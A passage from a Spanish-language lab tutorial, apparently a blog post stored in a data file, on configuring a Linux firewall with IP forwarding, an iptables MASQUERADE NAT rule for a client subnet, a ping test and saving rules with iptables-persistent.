fichero /etc/sysctl.conf y descomentar la línea que pone #net.ipv4.ip_forward=1Para aplicar la configuración que acabamos de hacer vamos a usar el comando sudo sysctl -p /etc/sysctl.confsudo sysctl -p /etc/sysctl.conf  Ahora si, pasamos a configurar Iptables.Listamos las reglas que tiene Iptables actualmente:root@Firewall:~# iptables -L -nvChain INPUT (policy ACCEPT 0 packets, 0 bytes) pkts bytes target     prot opt in     out     source               destination         Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target     prot opt in     out     source               destination         Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes) pkts bytes target     prot opt in     out     source               destination         root@Firewall:~# Por último vamos a agregar una regla para que la máquina ClienteUbuntu tenga acceso a internet.root@Firewall:~# iptables -t nat -A POSTROUTING -s 192.168.14.0/24 -o eth0 -j MASQUERADEroot@Firewall:~#   MASQUERADE permite que la red 192.168.14.0 tenga enmascaramiento y tenga una IP válida para salir al exterior.Si hacemos ping a la IP de google (8.8.8.8) funciona correctamente.root@ClienteUbuntu:~# ping -c 2 8.8.8.8PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.64 bytes from 8.8.8.8: icmp_seq=1 ttl=247 time=11.1 ms64 bytes from 8.8.8.8: icmp_seq=2 ttl=247 time=10.7 ms--- 8.8.8.8 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1001msrtt min/avg/max/mdev = 10.696/10.897/11.099/0.201 msroot@ClienteUbuntu:~# Guardar configuración de IptablesTodos los cambios realizados en Iptables se borrarán una vez reiniciemos la máquina Firewall, así que vamos a aprender como podemos guardar todos los cambios.Instalamos el paquete iptables-persistent (Cuando nos pregunte Save current IPv4/IPv6 rules? le damos a Yes)root@Firewall:~# apt install iptables-persistent -yReading package lists... DoneBuilding dependency tree... DoneReading state information... Doneiptables-persistent is already the newest version (1.0.16).0 upgraded, 0 newly installed, 0 to remove and 117 not upgraded.root@Firewall:~# Guardamos la configuración con este comando:root@Firewall:~# netfilter-persistent saverun-parts: executing /usr/share/netfilter-persistent/plugins.d/15-ip4tables saverun-parts: executing /usr/share/netfilter-persistent/plugins.d/25-ip6tables saveroot@Firewall:~#Si reiniciamos la máquina, nuestras reglas de Iptables seguirán como estaban configuradas.Y aquí da por finalizado el laboratorio, muchas gracias por leer el post, nos vemos en el próximo :)"
  }
  
]

